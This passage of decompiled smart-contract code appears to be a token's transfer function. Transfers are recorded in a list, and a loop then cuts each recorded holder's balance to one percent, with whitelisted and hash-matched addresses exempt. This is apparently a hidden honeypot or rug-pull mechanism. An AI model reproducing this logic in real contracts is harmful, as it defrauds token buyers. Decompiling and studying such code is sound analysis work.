                                revert with 'NH{q', 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                            return 1
                    else:
                        if stor6[address(arg1)]:
                            if arg2 < 0:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -1:
                                revert with 'NH{q', 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                            return 1
                    if stor14:
                        if arg2 < 0:
                            revert with 'NH{q', 17
                        if balanceOf[0] > -1:
                            revert with 'NH{q', 17
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 'NH{q', 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[address(arg1)] > -arg2 - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] += arg2
                        emit Transfer(arg2, msg.sender, arg1);
                        return 1
                    if not arg2:
                        require arg2 <= _maxTxAmount
                        require ext_code.size(stor16)
                        staticcall stor16.factory() with:
                                gas gas_remaining wei
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        require ext_code.size(stor16)
                        staticcall stor16.WETH() with:
                                gas gas_remaining wei
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        mem[(15 * ceil32(return_data.size)) + 268] = this.address
                        mem[(15 * ceil32(return_data.size)) + 300] = address(ext_call.return_data[0])
                        require ext_code.size(address(ext_call.return_data[0]))
                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                gas gas_remaining wei
                               args address(this.address), address(ext_call.return_data[0]), mem[(15 * ceil32(return_data.size)) + 332 len 5 * ceil32(return_data.size)]
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        if ext_call.return_data[12 len 20] == arg1:
                            if arg2 < 0:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -1:
                                revert with 'NH{q', 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] += arg2
                            emit Transfer(address arg1, address arg2, uint256 arg3):
                                          arg2,
                                          mem[(17 * ceil32(return_data.size)) + 296 len 9 * ceil32(return_data.size)],
                                          msg.sender,
                                          arg1,
                            return 1, mem[(17 * ceil32(return_data.size)) + 296 len 9 * ceil32(return_data.size)]
                        stor15.length++
                        stor15[stor15.length].field_0 = arg1
                        stor15[stor15.length].field_256 = arg2
                        if arg2 < 0:
                            revert with 'NH{q', 17
                        if balanceOf[0] > -1:
                            revert with 'NH{q', 17
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 'NH{q', 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[address(arg1)] > -arg2 - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] += arg2
                        emit Transfer(address arg1, address arg2, uint256 arg3):
                                      arg2,
                                      mem[(17 * ceil32(return_data.size)) + 360 len 9 * ceil32(return_data.size)],
                                      msg.sender,
                                      arg1,
                    else:
                        if arg2 and _fee > -1 / arg2:
                            revert with 'NH{q', 17
                        if not arg2:
                            revert with 'NH{q', 18
                        if arg2 * _fee / arg2 != _fee:
                            revert with 0, 'SafeMath: multiplication overflow'
                        require arg2 <= _maxTxAmount
                        require ext_code.size(stor16)
                        staticcall stor16.factory() with:
                                gas gas_remaining wei
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        require ext_code.size(stor16)
                        staticcall stor16.WETH() with:
                                gas gas_remaining wei
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        mem[(15 * ceil32(return_data.size)) + 268] = this.address
                        mem[(15 * ceil32(return_data.size)) + 300] = address(ext_call.return_data[0])
                        require ext_code.size(address(ext_call.return_data[0]))
                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                gas gas_remaining wei
                               args address(this.address), address(ext_call.return_data[0]), mem[(15 * ceil32(return_data.size)) + 332 len 5 * ceil32(return_data.size)]
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        if ext_call.return_data[12 len 20] == arg1:
                            if arg2 < arg2 * _fee / 100:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                revert with 'NH{q', 17
                            balanceOf[0] += arg2 * _fee / 100
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                            emit Transfer(address arg1, address arg2, uint256 arg3):
                                          arg2 - (arg2 * _fee / 100),
                                          mem[(17 * ceil32(return_data.size)) + 296 len 9 * ceil32(return_data.size)],
                                          msg.sender,
                                          arg1,
                            if arg2 * _fee / 100 > 0:
                                emit Transfer(address arg1, address arg2, uint256 arg3):
                                              arg2 * _fee / 100,
                                              mem[(17 * ceil32(return_data.size)) + 296 len 9 * ceil32(return_data.size)],
                                              msg.sender,
                                              0,
                            return 1, mem[(17 * ceil32(return_data.size)) + 296 len 9 * ceil32(return_data.size)]
                        stor15.length++
                        stor15[stor15.length].field_0 = arg1
                        stor15[stor15.length].field_256 = arg2
                        if arg2 < arg2 * _fee / 100:
                            revert with 'NH{q', 17
                        if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                            revert with 'NH{q', 17
                        balanceOf[0] += arg2 * _fee / 100
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 'NH{q', 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                        emit Transfer(address arg1, address arg2, uint256 arg3):
                                      arg2 - (arg2 * _fee / 100),
                                      mem[(17 * ceil32(return_data.size)) + 360 len 9 * ceil32(return_data.size)],
                                      msg.sender,
                                      arg1,
                        if arg2 * _fee / 100 > 0:
                            emit Transfer(address arg1, address arg2, uint256 arg3):
                                          arg2 * _fee / 100,
                                          mem[(17 * ceil32(return_data.size)) + 360 len 9 * ceil32(return_data.size)],
                                          msg.sender,
                                          0,
                    return 1, mem[(17 * ceil32(return_data.size)) + 360 len 9 * ceil32(return_data.size)]
                idx = 0
                while idx < stor15.length:
                    mem[0] = stor15[idx].field_0
                    mem[32] = 3
                    _644 = mem[64]
                    mem[64] = mem[64] + 64
                    mem[_644] = 26
                    mem[_644 + 32] = 'SafeMath: division by zero'
                    if idx >= stor15.length:
                        revert with 'NH{q', 50
                    mem[0] = stor15[idx].field_0
                    mem[32] = 3
                    balanceOf[stor15[idx].field_0] = balanceOf[stor15[idx].field_0] / 100
                    if idx == -1:
                        revert with 'NH{q', 17
                    idx = idx + 1
                    continue 
                stor15.length = 0
                mem[0] = 15
                idx = 0
                while 2 * stor15.length > idx:
                    stor15[idx].field_0 = 0
                    stor15[idx].field_256 = 0
                    idx = idx + 2
                    continue 
                require ext_code.size(stor16)
                staticcall stor16.factory() with:
                        gas gas_remaining wei
                mem[mem[64]] = ext_call.return_data[0]
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                _7008 = mem[64]
                mem[64] = mem[64] + ceil32(return_data.size)
                require return_data.size >= 32
                _7019 = mem[_7008]
                require mem[_7008] == mem[_7008 + 12 len 20]
                require ext_code.size(stor16)
                staticcall stor16.WETH() with:
                        gas gas_remaining wei
                mem[mem[64]] = ext_call.return_data[0]
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                _7037 = mem[64]
                mem[64] = mem[64] + ceil32(return_data.size)
                require return_data.size >= 32
                _7043 = mem[_7037]
                require mem[_7037] == mem[_7037 + 12 len 20]
                mem[mem[64] + 4] = this.address
                mem[mem[64] + 36] = address(_7043)
                require ext_code.size(address(_7019))
                staticcall address(_7019).getPair(address arg1, address arg2) with:
                        gas gas_remaining wei
                       args address(this.address), address(_7043)
                mem[mem[64]] = ext_call.return_data[0]
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                _7061 = mem[64]
                mem[64] = mem[64] + ceil32(return_data.size)
                require return_data.size >= 32
                require mem[_7061] == mem[_7061 + 12 len 20]
                if arg1 != mem[_7061 + 12 len 20]:
                    require ext_code.size(stor16)
                    staticcall stor16.factory() with:
                            gas gas_remaining wei
                    mem[mem[64]] = ext_call.return_data[0]
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    _7115 = mem[64]
                    mem[64] = mem[64] + ceil32(return_data.size)
                    require return_data.size >= 32
                    _7133 = mem[_7115]
                    require mem[_7115] == mem[_7115 + 12 len 20]
                    require ext_code.size(stor16)
                    staticcall stor16.WETH() with:
                            gas gas_remaining wei
                    mem[mem[64]] = ext_call.return_data[0]
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    _7181 = mem[64]
                    mem[64] = mem[64] + ceil32(return_data.size)
                    require return_data.size >= 32
                    _7211 = mem[_7181]
                    require mem[_7181] == mem[_7181 + 12 len 20]
                    mem[mem[64] + 4] = this.address
                    mem[mem[64] + 36] = address(_7211)
                    require ext_code.size(address(_7133))
                    staticcall address(_7133).getPair(address arg1, address arg2) with:
                            gas gas_remaining wei
                           args address(this.address), address(_7211)
                    mem[mem[64]] = ext_call.return_data[0]
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    _7365 = mem[64]
                    mem[64] = mem[64] + ceil32(return_data.size)
                    require return_data.size >= 32
                    _7433 = mem[_7365]
                    require mem[_7365] == mem[_7365 + 12 len 20]
                    if mem[_7365 + 12 len 20] != msg.sender:
                        if stor6[address(msg.sender)]:
                            if arg2 < 0:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -1:
                                revert with 'NH{q', 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                        else:
                            mem[0] = arg1
                            mem[32] = 6
                            if stor6[address(arg1)]:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                            else:
                                mem[mem[64] + 32] = address(arg1)
                                _7799 = mem[64]
                                mem[mem[64]] = 20
                                mem[64] = mem[64] + 52
                                if sha3(mem[_7799 + 32 len mem[_7799]]) == 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
                                    if arg2 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    if arg1 == this.address:
                                        if arg2 < 0:
                                            revert with 'NH{q', 17
                                        if balanceOf[0] > -1:
                                            revert with 'NH{q', 17
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 'NH{q', 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg1)] += arg2
                                        emit Transfer(arg2, msg.sender, arg1);
                                    else:
                                        if msg.sender == address(_7433):
                                            if arg2 < 0:
                                                revert with 'NH{q', 17
                                            if balanceOf[0] > -1:
                                                revert with 'NH{q', 17
                                            if balanceOf[address(msg.sender)] < arg2:
                                                revert with 'NH{q', 17
                                            balanceOf[address(msg.sender)] -= arg2
                                            if balanceOf[address(arg1)] > -arg2 - 1:
                                                revert with 'NH{q', 17
                                            balanceOf[address(arg1)] += arg2
                                            emit Transfer(arg2, msg.sender, arg1);
                                        else:
                                            if stor14:
                                                if arg2 < 0:
                                                    revert with 'NH{q', 17
                                                if balanceOf[0] > -1:
                                                    revert with 'NH{q', 17
                                                if balanceOf[address(msg.sender)] < arg2:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(msg.sender)] -= arg2
                                                if balanceOf[address(arg1)] > -arg2 - 1:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(arg1)] += arg2
                                                emit Transfer(arg2, msg.sender, arg1);
                                            else:
                                                if not arg2:
                                                    require arg2 <= _maxTxAmount
                                                    require ext_code.size(stor16)
                                                    staticcall stor16.factory() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(stor16)
                                                    staticcall stor16.WETH() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(address(ext_call.return_data[0]))
                                                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                            gas gas_remaining wei
                                                           args address(this.address), address(ext_call.return_data[0])
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    if ext_call.return_data[12 len 20] != arg1:
                                                        stor15.length++
                                                        stor15[stor15.length].field_0 = arg1
                                                        stor15[stor15.length].field_256 = arg2
                                                    if arg2 < 0:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[0] > -1:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(arg1)] += arg2
                                                    emit Transfer(arg2, msg.sender, arg1);
                                                else:
                                                    if arg2 and _fee > -1 / arg2:
                                                        revert with 'NH{q', 17
                                                    if not arg2:
                                                        revert with 'NH{q', 18
                                                    if arg2 * _fee / arg2 != _fee:
                                                        revert with 0, 'SafeMath: multiplication overflow'
                                                    require arg2 <= _maxTxAmount
                                                    require ext_code.size(stor16)
                                                    staticcall stor16.factory() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(stor16)
                                                    staticcall stor16.WETH() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(address(ext_call.return_data[0]))
                                                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                            gas gas_remaining wei
                                                           args address(this.address), address(ext_call.return_data[0])
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    if ext_call.return_data[12 len 20] != arg1:
                                                        stor15.length++
                                                        stor15[stor15.length].field_0 = arg1
                                                        stor15[stor15.length].field_256 = arg2
                                                    if arg2 < arg2 * _fee / 100:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[0] += arg2 * _fee / 100
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                                                    emit Transfer((arg2 - (arg2 * _fee / 100)), msg.sender, arg1);
                                                    if arg2 * _fee / 100 > 0:
                                                        emit Transfer((arg2 * _fee / 100), msg.sender, 0);
                    else:
                        if stor6[address(msg.sender)]:
                            if arg2 < 0:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -1:
                                revert with 'NH{q', 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                        else:
                            mem[0] = arg1
                            mem[32] = 6
                            if stor6[address(arg1)]:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                            else:
                                mem[mem[64] + 32] = address(arg1)
                                _7827 = mem[64]
                                mem[mem[64]] = 20
                                mem[64] = mem[64] + 52
                                if sha3(mem[_7827 + 32 len mem[_7827]]) == 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
                                    if arg2 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    if arg1 == this.address:
                                        if arg2 < 0:
                                            revert with 'NH{q', 17
                                        if balanceOf[0] > -1:
                                            revert with 'NH{q', 17
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 'NH{q', 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg1)] += arg2
                                        emit Transfer(arg2, msg.sender, arg1);
                                    else:
                                        if stor6[address(arg1)]:
                                            if arg2 < 0:
                                                revert with 'NH{q', 17
                                            if balanceOf[0] > -1:
                                                revert with 'NH{q', 17
                                            if balanceOf[address(msg.sender)] < arg2:
                                                revert with 'NH{q', 17
                                            balanceOf[address(msg.sender)] -= arg2
                                            if balanceOf[address(arg1)] > -arg2 - 1:
                                                revert with 'NH{q', 17
                                            balanceOf[address(arg1)] += arg2
                                            emit Transfer(arg2, msg.sender, arg1);
                                        else:
                                            if stor14:
                                                if arg2 < 0:
                                                    revert with 'NH{q', 17
                                                if balanceOf[0] > -1:
                                                    revert with 'NH{q', 17
                                                if balanceOf[address(msg.sender)] < arg2:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(msg.sender)] -= arg2
                                                if balanceOf[address(arg1)] > -arg2 - 1:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(arg1)] += arg2
                                                emit Transfer(arg2, msg.sender, arg1);
                                            else:
                                                if not arg2:
                                                    require arg2 <= _maxTxAmount
                                                    require ext_code.size(stor16)
                                                    staticcall stor16.factory() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(stor16)
                                                    staticcall stor16.WETH() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(address(ext_call.return_data[0]))
                                                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                            gas gas_remaining wei
                                                           args address(this.address), address(ext_call.return_data[0])
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    if ext_call.return_data[12 len 20] != arg1:
                                                        stor15.length++
                                                        stor15[stor15.length].field_0 = arg1
                                                        stor15[stor15.length].field_256 = arg2
                                                    if arg2 < 0:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[0] > -1:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(arg1)] += arg2
                                                    emit Transfer(arg2, msg.sender, arg1);
                                                else:
                                                    if arg2 and _fee > -1 / arg2:
                                                        revert with 'NH{q', 17
                                                    if not arg2:
                                                        revert with 'NH{q', 18
                                                    if arg2 * _fee / arg2 != _fee:
                                                        revert with 0, 'SafeMath: multiplication overflow'
                                                    require arg2 <= _maxTxAmount
                                                    require ext_code.size(stor16)
                                                    staticcall stor16.factory() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(stor16)
                                                    staticcall stor16.WETH() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(address(ext_call.return_data[0]))
                                                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                            gas gas_remaining wei
                                                           args address(this.address), address(ext_call.return_data[0])
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    if ext_call.return_data[12 len 20] != arg1:
                                                        stor15.length++
                                                        stor15[stor15.length].field_0 = arg1
                                                        stor15[stor15.length].field_256 = arg2
                                                    if arg2 < arg2 * _fee / 100:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[0] += arg2 * _fee / 100
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                                                    emit Transfer((arg2 - (arg2 * _fee / 100)), msg.sender, arg1);
                                                    if arg2 * _fee / 100 > 0:
                                                        emit Transfer((arg2 * _fee / 100), msg.sender, 0);
                else:
                    mem[0] = msg.sender
                    mem[32] = 6
                    if stor6[address(msg.sender)]:
                        if stor6[address(msg.sender)]:
                            if arg2 < 0:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -1:
                                revert with 'NH{q', 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                        else:
                            mem[0] = arg1
                            mem[32] = 6
                            if stor6[address(arg1)]:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                            else:
                                mem[mem[64] + 32] = address(arg1)
                                _7197 = mem[64]
                                mem[mem[64]] = 20
                                mem[64] = mem[64] + 52
                                if sha3(mem[_7197 + 32 len mem[_7197]]) == 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
                                    if arg2 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    if arg1 == this.address:
                                        if arg2 < 0:
                                            revert with 'NH{q', 17
                                        if balanceOf[0] > -1:
                                            revert with 'NH{q', 17
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 'NH{q', 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg1)] += arg2
                                        emit Transfer(arg2, msg.sender, arg1);
                                    else:
                                        if stor6[address(msg.sender)]:
                                            if arg2 < 0:
                                                revert with 'NH{q', 17
                                            if balanceOf[0] > -1:
                                                revert with 'NH{q', 17
                                            if balanceOf[address(msg.sender)] < arg2:
                                                revert with 'NH{q', 17
                                            balanceOf[address(msg.sender)] -= arg2
                                            if balanceOf[address(arg1)] > -arg2 - 1:
                                                revert with 'NH{q', 17
                                            balanceOf[address(arg1)] += arg2
                                            emit Transfer(arg2, msg.sender, arg1);
                                        else:
                                            if stor14:
                                                if arg2 < 0:
                                                    revert with 'NH{q', 17
                                                if balanceOf[0] > -1:
                                                    revert with 'NH{q', 17
                                                if balanceOf[address(msg.sender)] < arg2:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(msg.sender)] -= arg2
                                                if balanceOf[address(arg1)] > -arg2 - 1:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(arg1)] += arg2
                                                emit Transfer(arg2, msg.sender, arg1);
                                            else:
                                                if not arg2:
                                                    require arg2 <= _maxTxAmount
                                                    require ext_code.size(stor16)
                                                    staticcall stor16.factory() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(stor16)
                                                    staticcall stor16.WETH() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(address(ext_call.return_data[0]))
                                                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                            gas gas_remaining wei
                                                           args address(this.address), address(ext_call.return_data[0])
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    if ext_call.return_data[12 len 20] != arg1:
                                                        stor15.length++
                                                        stor15[stor15.length].field_0 = arg1
                                                        stor15[stor15.length].field_256 = arg2
                                                    if arg2 < 0:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[0] > -1:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(arg1)] += arg2
                                                    emit Transfer(arg2, msg.sender, arg1);
                                                else:
                                                    if arg2 and _fee > -1 / arg2:
                                                        revert with 'NH{q', 17
                                                    if not arg2:
                                                        revert with 'NH{q', 18
                                                    if arg2 * _fee / arg2 != _fee:
                                                        revert with 0, 'SafeMath: multiplication overflow'
                                                    require arg2 <= _maxTxAmount
                                                    require ext_code.size(stor16)
                                                    staticcall stor16.factory() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
